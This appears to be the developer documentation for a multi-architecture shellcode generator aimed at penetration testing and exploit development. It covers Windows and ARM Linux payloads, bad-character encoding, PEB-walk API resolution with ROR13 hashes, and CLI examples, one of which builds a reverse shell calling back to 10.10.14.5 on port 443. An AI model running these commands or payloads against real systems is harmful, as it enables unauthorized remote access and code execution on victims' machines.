# Shellcode Generator - Technical Documentation

**Author:** Dawid Esterhuizen
**Purpose:** Multi-architecture shellcode generation with bad character avoidance

---

## Development Guidelines

### Critical Rules
1. **NO GIT OPERATIONS**: Never execute git commands (add, commit, push, etc.)
   - Only print summaries of changes when requested
   - User handles all version control operations

2. **DOCUMENTATION REQUIREMENTS**: Always update when making major changes:
   - `README.md` - User-facing documentation
   - `CLAUDE.md` - Development notes and technical details
   - Tool-specific docs in respective directories

3. **CONSISTENCY**: Follow existing patterns, naming conventions, code style

---

## Architecture

```
shellgen/
├── src/
│   ├── encoders.py          # Bad char encoding (subtraction/addition)
│   ├── assembler.py         # Keystone/Capstone integration
│   ├── formatters.py        # Output: ASM, Python, C, raw, pyasm
│   ├── payloads.py          # High-level payload builders
│   ├── cli.py               # CLI interface
│   └── generators/
│       ├── windows.py       # x86/x64 - PEB walk, API resolution
│       └── linux.py         # ARM/ARM64 - Direct syscalls
├── shellgen_cli.py          # Main entry point
└── hash_generator.py        # ROR13 hash tool
```

**See [MODULAR_STRUCTURE.md](MODULAR_STRUCTURE.md) for detailed module documentation.**

---

## Supported Platforms & Architectures

| Platform | Architectures | Payloads |
|----------|---------------|----------|
| **Windows** | x86, x64 | messagebox, winexec, createprocess, shellexecute, system, download_exec, reverse_shell, reverse_shell_powershell, bind_shell |
| **Linux** | ARM, ARM64 | execve, reverse_shell |

### Output Formats
- **asm**: Assembly source code
- **python**: Python bytes string
- **c**: C-style char array
- **raw**: Raw binary shellcode
- **pyasm**: Python script with assembly for Keystone

---

## Key Features

### Bad Character Encoding (Windows x86/x64)
1. **Subtraction**: `clean - offset = target` with multiple increment strategies
2. **Addition**: `val1 + val2 = target` as fallback
3. **Default bad chars**: `0x00, 0x0a, 0x0d` (NULL, LF, CR)

### Windows Shellcode (x86/x64)
- **PEB Walk**: Robust kernel32.dll detection via BaseDllName.Length (x86) or "K" prefix check (x64)
- **Export Table Parsing**: Locates API functions via ROR13 hash resolution
- **Dynamic API Loading**: LoadLibraryA + GetProcAddress via hash lookup
- **String Consolidation**: Reuses strings to reduce shellcode size

**x86 Implementation:**
- PEB via `fs:[0x30]`, InInitializationOrderModuleList (offset 0x1C)
- Stack-based calling (stdcall), 4-byte pointers
- Registers: EBX=kernel32, [EBP+0x04]=find_function, [EBP+0x08]=LoadLibraryA

**x64 Implementation:**
- PEB via `gs:[0x60]`, InLoadInitOrder (offset 0x30)
- Fastcall convention (RCX, RDX, R8, R9 + stack), 32-byte shadow space
- 8-byte pointers, supports kernel32.dll and kernelbase.dll
- Registers: [RBP+0x08]=lookup_func, [RBP+0x10]=LoadLibraryA, [RBP+0x20]=kernel32 base

### Linux Shellcode (ARM/ARM64)
- **Direct Syscalls**: ARM32 `swi #0` (r7=syscall#), ARM64 `svc #0` (x8=syscall#)
- **Key Syscalls**: execve, socket, connect, dup2/dup3
- **Data Storage**: PC-relative addressing via `adr`, `.asciz` directives, stack-based argv

---

## CLI Options

| Option | Description | Default |
|--------|-------------|---------|
| `--list-payloads` | List available payloads | - |
| `--platform` | windows, linux | Required |
| `--payload` | Payload name | Required |
| `--arch` | x86, x64, arm, arm64 | x86 |
| `--format` | asm, python, c, raw, pyasm | asm |
| `--bad-chars` | Hex bytes to avoid (comma-separated) | 00,0a,0d |
| `--verify` | Verify shellcode for bad chars | False |
| `--debug-shellcode` | Disassemble with Capstone, map bad chars | False |
| `--no-exit` | Skip ExitProcess | False |
| `--output` | Output filename | shellcode.asm |

**Payload-specific options:** `--title`, `--message`, `--cmd`, `--url`, `--save-path`, `--host`, `--port`, `--show-window`

---

## Usage Examples

### Direct Usage
```bash
# List payloads
./shellgen_cli.py --list-payloads

# Windows x64 reverse shell
./shellgen_cli.py --platform windows --payload reverse_shell \
  --host 10.10.14.5 --port 443 --arch x64

# Linux ARM64 command execution
./shellgen_cli.py --platform linux --payload execve \
  --cmd "/bin/sh" --arch arm64 --format python

# After installation (via INSTALL.md)
shellgen --platform windows --payload messagebox --title "Test" --message "Hello"
hash_generator LoadLibraryA GetProcAddress
```

### Verification & Debugging
```bash
# Verify for bad characters
./shellgen_cli.py --platform windows --payload winexec \
  --cmd "calc.exe" --bad-chars 00,0a,0d,20 --verify

# Debug with Capstone disassembly
./shellgen_cli.py --platform windows --payload winexec \
  --cmd "calc.exe" --arch x86 --bad-chars 00,0a,0d,20 --debug-shellcode
```

**Debug output includes:**
- Complete disassembly with byte offsets
- Bad characters highlighted in red with "!!!" markers
- Mapping of bad chars to specific instructions (shows exact byte position)
- Recommendations for fixes (e.g., use LEA+MOV instead of scaled index)

---

## Python Library Usage

### Generate Windows MessageBox
```python
from src.generators import WindowsGenerator
from src.payloads import windows_messagebox
from src.assembler import assemble_to_binary

config = windows_messagebox(title="Pwned", message="Hello!", bad_chars={0x00, 0x0a, 0x0d})
generator = WindowsGenerator(config['bad_chars'], arch='x86')
asm_code = generator.generate(config)
shellcode = assemble_to_binary(asm_code, arch='x86')
```

### Custom Windows Payload
```python
from src.generators import WindowsGenerator

config = {
    'bad_chars': {0x00, 0x0a, 0x0d},
    'calls': [
        {'api': 'CreateFileA', 'dll': 'kernel32.dll',
         'args': ['C:\\test.txt', 0x40000000, 0, 0, 2, 0, 0]},
        {'api': 'WriteFile', 'dll': 'kernel32.dll',
         'args': ['REG:eax', 'Hello!', 6, 'REG:esp', 0]}
    ],
    'exit': True
}
generator = WindowsGenerator(config['bad_chars'], arch='x86')
asm_code = generator.generate(config)
```

---

## Dependencies

### Keystone Engine (Assembly)
```bash
pip install keystone-engine
```
Converts assembly → machine code (all architectures, LLVM-based)

### Capstone Engine (Disassembly)
```bash
pip install capstone
```
Converts machine code → assembly (required for `--debug-shellcode`)

---

## Version History

| Version | Key Changes |
|---------|-------------|
| **v3.8** | x64 fixes: RIP-relative addressing, gen_push_string arch-aware, stack allocation bugs fixed, bind_shell_x64 payload added |
| **v3.7.1** | Bug fix: `--bad-chars` CLI override for JSON, Rich lib added to requirements |
| **v3.7** | ColorPrinter integration (lib/color_printer), visual enhancements (panels, hex preview, tables), enhanced payload listing |
| **v3.6** | Capstone-based `--debug-shellcode` (disassembly approach, fixes forward jumps, accurate byte-to-instruction mapping) |
| **v3.5** | Complete x64 support (PEB walk via gs:[0x60], fastcall convention, shadow space, TerminateProcess exit) |
| **v3.4** | Debug mode (`--debug-shellcode`), reverse shell fixes (WaitForSingleObject, handle inheritance) |
| **v3.3** | Reverse shell improvements (string preservation bug fix, native + PowerShell variants, WSASocketA integration) |
| **v3.2** | Enhanced payloads (CreateProcessA, ShellExecuteA, system via msvcrt.dll) |
| **v3.1** | OS-specific generators (WindowsGenerator, LinuxGenerator), unified interface |
| **v3.0** | Modular refactoring (core/generators/, encoders, formatters, payloads), library usage support |
| **v2.0** | ARM/ARM64 Linux support (execve, reverse_shell, direct syscalls) |
| **v1.0** | Initial x86 Windows support (PEB walk, ROR13 hash, bad char encoding) |

---

## ROR13 Hash Algorithm

```python
def ror13_hash(name):
    h = 0
    for c in name:
        h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF
        h = (h + ord(c)) & 0xFFFFFFFF
    return h

# Known hashes:
# GetProcAddress: 0x7c0dfcaa
# LoadLibraryA: 0xec0e4e8e
```

---

## Limitations

1. **Windows ARM/ARM64**: Not implemented (different conventions)
2. **Linux x86/x64**: Not yet implemented (use ARM/ARM64)
3. **Bad Character Encoding**: Only Windows x86/x64
4. **Complex Payloads**: Some edge cases need manual adjustment

---

## Troubleshooting

| Error | Solution |
|-------|----------|
| "No module named 'keystone'" | `pip install keystone-engine` |
| "Cannot encode 0x..." | Reduce bad char restrictions, try different payload, manual encoding |
| "Unsupported platform/arch" | Check compatibility (Windows: x86/x64, Linux: arm/arm64) |

---

## Security Considerations

**Authorized defensive security testing only:**
- Penetration testing engagements
- Exploit development research
- Defensive security training
- Red team operations (authorized)
- CTF competitions

**Do not use for:**
- Unauthorized access
- Malware development
- Illegal activities

---

## References

- [PEB Walk Technique](https://en.wikipedia.org/wiki/Process_Environment_Block)
- [ROR13 Hash Algorithm](https://www.fireeye.com/blog/threat-research/2019/10/api-hashing-tool.html)
- [ARM Syscall Numbers](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)
- [Keystone Engine](http://www.keystone-engine.org/)
- [Modular Structure Details](MODULAR_STRUCTURE.md)

---

*Maintained alongside codebase to track AI-assisted development.*